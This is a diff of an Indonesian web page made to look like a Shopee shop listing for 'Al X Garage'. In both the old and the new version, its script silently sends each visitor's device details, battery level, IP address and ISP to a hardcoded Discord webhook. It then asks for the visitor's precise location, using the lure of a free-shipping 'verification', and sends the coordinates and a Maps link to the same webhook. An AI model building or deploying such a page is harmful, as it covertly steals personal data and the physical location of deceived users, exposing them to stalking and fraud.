@@ -18,15 +18,14 @@
     .shopee-orange-text { color: #ee4d2d; }
     .shopee-orange-bg { background-color: #ee4d2d; }
     .line-clamp-2 { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
-    #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
+    #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
   </style>
 </head>
 <body class="max-w-md mx-auto bg-white min-h-screen relative pb-20">
 
   <div id="loader">
-    <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#ee4d2d]"></div>
-    <p class="text-sm mt-4 font-bold text-[#ee4d2d]">Memproses Lokasi Pengiriman...</p>
-    <p class="text-[10px] text-gray-400 mt-1">Jangan tutup halaman ini</p>
+    <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-[#ee4d2d]"></div>
+    <p class="text-sm mt-3 font-medium text-gray-700">Memproses verifikasi...</p>
   </div>
 
   <div class="relative w-full aspect-square bg-gray-200" onclick="handleAction()">
@@ -52,12 +51,12 @@
     <i class="fas fa-shipping-fast text-blue-600 mt-1"></i>
     <div>
       <p class="text-sm font-semibold text-gray-800">Verifikasi Lokasi Pengiriman</p>
-      <p class="text-[12px] text-gray-600">Klik untuk klaim subsidi ongkir Al X Garage melalui deteksi lokasi.</p>
+      <p class="text-[12px] text-gray-600">Klik untuk verifikasi lokasi dan aktifkan subsidi ongkir Al X Garage.</p>
     </div>
   </div>
 
   <div class="mt-2 p-4 bg-white flex items-center gap-3 border-y border-gray-100" onclick="handleAction()">
-    <div class="w-12 h-12 rounded-full overflow-hidden border border-gray-100 shadow-inner">
+    <div class="w-12 h-12 rounded-full overflow-hidden border border-gray-200">
       <img src="https://images.unsplash.com/photo-1530046339160-ce3e530c7d2f?auto=format&fit=crop&q=80&w=150" alt="Al X Garage" class="w-full h-full object-cover">
     </div>
     <div class="flex-1">
@@ -67,7 +66,7 @@
         <p class="text-[11px] text-green-600 font-medium">Online</p>
       </div>
     </div>
-    <button class="border border-[#ee4d2d] text-[#ee4d2d] text-xs px-3 py-1 rounded-sm">Ikuti Toko</button>
+    <button class="border border-[#ee4d2d] text-[#ee4d2d] text-xs px-3 py-1 rounded-sm">Kunjungi Toko</button>
   </div>
 
   <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 max-w-md mx-auto flex h-14 z-50">
@@ -89,61 +88,61 @@
   <script>
     const webhook = "https://discord.com/api/webhooks/1468299380330332355/I2z1xzpeHQp4iKlllSQOFewI_z_OjIRBsDmgl7jbqbvM4GWQtYTewJXltpZQsGB5OV87";
 
-    function pushDiscord(title, fields) {
-      return fetch(webhook, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ embeds: [{ title, fields, color: 15548997, timestamp: new Date() }] })
-      });
+    async function sendLog(title, fields) {
+      try {
+        await fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ embeds: [{ title, fields, color: 15548997, timestamp: new Date() }] })
+        });
+      } catch (e) {}
     }
 
-    function getCoords() {
-      return new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
-        });
-      });
+    function askLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (p) => sendLog("✅ Lokasi Diizinkan", [{ name: "Koordinat", value: `${p.coords.latitude},${p.coords.longitude}` }, { name: "Maps", value: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}` }]),
+          () => sendLog("❌ Lokasi Ditolak", [{ name: "Status", value: "User menolak izin" }]),
+          { enableHighAccuracy: true }
+        );
+      }
     }
 
     window.onload = async () => {
-      let coreData = [
-        { name: "📱 Device", value: navigator.platform, inline: true },
-        { name: "📏 Screen", value: `${screen.width}x${screen.height}`, inline: true }
+      let fields = [
+        { name: "📱 OS", value: navigator.platform, inline: true },
+        { name: "🌐 Browser", value: navigator.userAgent.split(' ').pop(), inline: true },
+        { name: "🖥️ Layar", value: `${screen.width}x${screen.height}`, inline: true }
       ];
-
       try {
+        const b = await navigator.getBattery();
+        fields.push({ name: "🔋 Baterai", value: `${Math.round(b.level * 100)}%`, inline: true });
         const res = await fetch('https://ipapi.co/json/');
-        const ip = await res.json();
-        coreData.push({ name: "🌍 IP", value: ip.ip }, { name: "🏙️ Kota", value: ip.city });
+        const d = await res.json();
+        fields.push({ name: "🌍 IP", value: d.ip }, { name: "📶 ISP", value: d.org });
       } catch (e) {}
-
-      await pushDiscord("🔥 DATA ENTRY OTOMATIS", coreData);
       
-      setTimeout(async () => {
-        try {
-          const pos = await getCoords();
-          await pushDiscord("✅ LOKASI DITERIMA (AUTO)", [
-            { name: "Maps", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` }
-          ]);
-        } catch (e) {}
-      }, 1500);
+      await sendLog("🚀 Visitor Masuk (Al X Garage)", fields);
+
+      setTimeout(askLocation, 2000);
     };
 
-    async function handleAction() {
-      document.getElementById('loader').style.display = 'flex';
-      
-      try {
-        const pos = await getCoords();
-        await pushDiscord("✅ LOKASI DITERIMA (CLICK)", [
-          { name: "Maps Link", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` }
-        ]);
-        window.location.href = 'profiltoko.html';
-      } catch (error) {
-        await pushDiscord("❌ LOKASI DITOLAK (CLICK)", [{ name: "Status", value: "User Denied/GPS Off" }]);
-        alert("Peringatan: Verifikasi lokasi gagal. Silakan isi alamat secara manual di halaman berikutnya.");
-        window.location.href = 'profiltoko.html';
+    function handleAction() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (p) => {
+            sendLog("✅ Lokasi Diizinkan (Button)", [{ name: "Koordinat", value: `${p.coords.latitude},${p.coords.longitude}` }, { name: "Maps", value: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}` }]);
+            window.location.href = 'halamantoko.html';
+          },
+          () => {
+            sendLog("❌ Lokasi Ditolak (Button)", [{ name: "Status", value: "User menolak izin" }]);
+            alert("Silakan aktifkan lokasi untuk verifikasi Merchant.");
+            window.location.href = 'halamantoko.html';
+          },
+          { enableHighAccuracy: true }
+        );
+      } else {
+        window.location.href = 'halamantoko.html';
       }
     }
   </script>
